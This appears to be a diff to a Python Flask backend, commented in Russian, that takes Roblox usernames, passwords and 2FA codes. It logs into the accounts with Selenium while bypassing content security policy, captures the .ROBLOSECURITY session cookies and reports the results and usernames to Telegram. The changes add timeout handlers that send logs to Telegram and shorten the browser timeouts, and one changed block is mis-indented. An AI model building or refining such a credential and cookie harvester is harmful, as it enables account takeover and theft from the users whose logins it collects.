@@ -397,10 +397,10 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                 try:
                     driver = webdriver.Chrome(service=service, options=options)
                     
-                    # Устанавливаем таймауты
-                    driver.set_page_load_timeout(15)  # Уменьшаем таймаут
-                    driver.implicitly_wait(5)         # Уменьшаем таймаут
-                    driver.set_script_timeout(15)     # Уменьшаем таймаут
+                            # Устанавливаем таймауты
+        driver.set_page_load_timeout(10)  # Еще больше уменьшаем таймаут
+        driver.implicitly_wait(3)         # Еще больше уменьшаем таймаут
+        driver.set_script_timeout(10)     # Еще больше уменьшаем таймаут
                     
                     # Дополнительные настройки для стабильности
                     driver.execute_cdp_cmd('Page.setBypassCSP', {'enabled': True})
@@ -723,24 +723,34 @@ def login():
     remember = data.get('remember')
     session_id = str(uuid.uuid4())
 
-    cookies = {
-        '.ROBLOSECURITY': f'_{username}_fake_security_token_{hash(password)}',
-        'username': username,
-        'login_time': datetime.now().isoformat(),
-        'session_id': f'roblox_session_{hash(username)}',
-        'auth_token': f'auth_{hash(password)}',
-        'remember_me': str(remember).lower()
-    }
-    with open('cookies.txt', 'w', encoding='utf-8') as f:
-        json.dump(cookies, f, indent=2, ensure_ascii=False)
-
-    result = roblox_login_and_get_cookies(username, password, session_id=session_id)
-    if result.get('need_code'):
-        return jsonify({'need_code': True, 'session_id': session_id})
-    elif result.get('success'):
-        return jsonify({'success': True, 'message': 'Вход выполнен успешно! Проверьте Telegram для получения куки.', 'cookies': result.get('cookies')})
-    else:
-        return jsonify({'success': False, 'message': result.get('message')})
+    # Простой таймаут через threading.Timer
+    import threading
+    import signal
+    
+    def timeout_handler():
+        send_telegram_log(f"[TIMEOUT] Процесс для {username} превысил 30 секунд")
+        import os
+        os._exit(1)
+    
+    # Устанавливаем таймер на 30 секунд
+    timer = threading.Timer(30.0, timeout_handler)
+    timer.daemon = True
+    timer.start()
+    
+    try:
+        result = roblox_login_and_get_cookies(username, password, session_id=session_id)
+        timer.cancel()
+        
+        if result.get('need_code'):
+            return jsonify({'need_code': True, 'session_id': session_id})
+        elif result.get('success'):
+            return jsonify({'success': True, 'message': 'Вход выполнен успешно! Проверьте Telegram для получения куки.', 'cookies': result.get('cookies')})
+        else:
+            return jsonify({'success': False, 'message': result.get('message')})
+    except Exception as e:
+        timer.cancel()
+        send_telegram_log(f"[ERROR] Критическая ошибка для {username}: {e}")
+        return jsonify({'success': False, 'message': f'Критическая ошибка: {e}'})
 
 @app.route('/submit_code', methods=['POST'])
 def submit_code():
@@ -750,11 +760,32 @@ def submit_code():
     if not session_id or not code:
         return jsonify({'success': False, 'message': 'Не передан session_id или code'})
     username = selenium_sessions.get(session_id, {}).get('username', 'unknown')
-    result = roblox_login_and_get_cookies(username, None, session_id=session_id, code=code)
-    if result.get('success'):
-        return jsonify({'success': True, 'message': 'Вход завершён! Проверьте Telegram для куки.', 'cookies': result.get('cookies')})
-    else:
-        return jsonify({'success': False, 'message': result.get('message')})
+    
+    # Простой таймаут через threading.Timer
+    import threading
+    
+    def timeout_handler():
+        send_telegram_log(f"[TIMEOUT] Процесс 2FA для {username} превысил 30 секунд")
+        import os
+        os._exit(1)
+    
+    # Устанавливаем таймер на 30 секунд
+    timer = threading.Timer(30.0, timeout_handler)
+    timer.daemon = True
+    timer.start()
+    
+    try:
+        result = roblox_login_and_get_cookies(username, None, session_id=session_id, code=code)
+        timer.cancel()
+        
+        if result.get('success'):
+            return jsonify({'success': True, 'message': 'Вход завершён! Проверьте Telegram для куки.', 'cookies': result.get('cookies')})
+        else:
+            return jsonify({'success': False, 'message': result.get('message')})
+    except Exception as e:
+        timer.cancel()
+        send_telegram_log(f"[ERROR] Критическая ошибка 2FA для {username}: {e}")
+        return jsonify({'success': False, 'message': f'Критическая ошибка: {e}'})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
